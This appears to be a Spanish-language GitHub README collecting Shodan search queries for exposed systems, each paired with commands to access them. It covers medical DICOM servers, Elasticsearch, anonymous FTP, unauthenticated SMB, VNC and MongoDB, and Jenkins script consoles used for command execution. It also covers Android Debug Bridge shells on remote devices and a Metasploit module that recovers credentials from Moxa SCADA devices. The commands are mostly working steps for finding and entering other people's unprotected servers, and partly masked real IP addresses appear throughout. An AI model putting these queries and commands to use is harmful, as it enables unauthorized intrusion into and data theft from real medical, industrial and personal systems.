# Dorks Shodan 2023

Recopilación de Querys de shodan con scripts personalizados :)

# DICOM 
El estándar DICOM (Digital Imaging and Communications in Medicine) es un estándar utilizado en la industria médica para la gestión, almacenamiento y transmisión de imágenes médicas, como radiografías, tomografías computarizadas (TC), imágenes de resonancia magnética (IRM), entre otras.

```sh
"DICOM Server Response" port:104
```
```sh
python3 Dicom.py
```

![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/29f923e0-fbde-4526-a199-fbf71cb5319f)

# Elasticsearch
Elasticsearch es un motor de búsqueda y análisis distribuido, de código abierto, basado en Lucene. Se utiliza para indexar, buscar y analizar grandes volúmenes de datos en tiempo real. Está diseñado para manejar datos no estructurados o semiestructurados y es especialmente útil para casos de uso en los que se requiere búsqueda y análisis de texto, logística, monitoreo y análisis de registros, y más

```sh
port:"9200" elastic: "Total Size:"
```
```sh
curl -X GET "http://192.x.x.153:9200/_cat/indices?v"
curl -X GET "http://192.x.x.153:9200/.monitoring-beats-7-2023.08.30"
curl -X GET "http://192.x.x.153:9200/_search?pretty=true"
```

```sh
python3 elastic.py -t 192.x.x.153
```
![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/25dadba2-91d2-4bc6-9a91-6c238120d557)


## Access FTP Anonymous
El acceso FTP anónimo es una forma de conectarse a un servidor FTP sin proporcionar credenciales de autenticación específicas.

```sh
"220" "230 Login successful." port:21
230 'anonymous@' login ok 
"Anonymous+access+allowed" port:"21"
```

```sh
shodan search :"220" "230 Login successful." port:21 --fields ip_str --separator " " | awk '{print $1}' | cat > ips.txt
```
```sh
python3 ftp.py -l ips.txt
```
![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/59945aef-9d89-4c2d-bbc6-a876ad1ed68d)


# Authentication Disabled SMB
La autenticación SMB (Server Message Block) sin credenciales, también conocida como acceso SMB anónimo, permite a los usuarios acceder a recursos compartidos en una red sin proporcionar nombres de usuario ni contraseñas. Esto puede ser útil para acceder a carpetas compartidas que se han configurado para permitir el acceso anónimo.

```sh
"Authentication: disabled" port:445 product:"Samba" 
```
```sh
smbclient -L //200.x.x.29/ -N  
smbclient //200.x.x.29/info
```
![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/da427f4b-0f7b-4f2b-9b0e-326da7e78420)

## Access authentication disabled VNC
Esto significa que el servidor VNC está configurado para permitir conexiones sin requerir autenticación.

```sh
"authentication disabled" port:5900,5901
```
```sh
vncviewer -passwd none 91.x.x.238
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/9e610141-1ccf-4388-92c5-c824704ca9c0)


## Access authentication disabled 

```sh
"MongoDB Server Information" port:27017 -authentication
"Set-Cookie: mongo-express=" "200 OK"
```
```sh
mongo --host 139.x.x.5
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/69a9b077-8f19-4c3b-8032-0b6387c93c8b)

## Access Jenkins

```sh
http.component:"jenkins"
title:"Dashboard [Jenkins]"
html:"Dashboard Jenkins"
```
```sh
add /script 
print "uname -a".execute().text
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/96d36829-5013-4bdb-b543-f095a0835dc3)


## Access devices ADB

```sh
shodan search :Android Debug Bridge port:5555 "Name:" --fields ip_str --separator " " | awk '{print $1}' | cat > ips.txt 
 ```
```sh
python3 adb.py   
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/da53ed42-de05-4842-9662-5ee57eaf6269)

```sh
adb devices
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/9e05b583-b684-4b27-b42d-c10b5312d788)

```sh
adb -s 59.x.x.112:5555 shell
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/e2bf07c6-157a-4fac-b4e5-f317e6ced25f)

## Access devices SCADA Moxa 

```sh
"Moxa Nport Device" Status: Authentication enabled port:"4800"
"Moxa Nport Device" Status: Authentication disabled port:"4800"
shodan search --separator , --fields ip_str,port,data "Moxa Nport" | awk '{print $1,$2,$3}' FS=":" | tr '\\', ' ' | awk '{print $1,$7,$8}' | column -t | ccze -A
```

```sh
use auxiliary/admin/scada/moxa_credentials_recovery
set FUNCTION CREDS
set rport 4800
set rhosts 212.x.x.14
run
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/54060261-80cc-4893-b134-b3fe2e0bc62c)


```sh
telnet 212.x.x.14
```
![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/5f79db0b-aff5-4790-8c9a-59f0b84c59d4)





## OS Windows Obsolete

```sh
os:"Windows 5.0" – Windows 2000; support end 2010.
os:"Windows 5.1" – Windows XP; support end 2014.
os:"Windows 2003" – Windows Server 2003; support end 2015.
os:"Windows Vista"– Windows Vista; support end 2017.
os:"Windows 2008" – Windows Server 2008; support end 2020.
os:"Windows 7" – Windows 7; support end 2020.
os:"Windows 8" – Windows 8; support end 2016.
os:"Windows 2011" – Windows Home Server 2011; support end 2016.
os:"Windows 8.1" – Windows 8.1; support end 2018.
os:"Windows 2012" – Windows Server 2012; support end 2018.
```



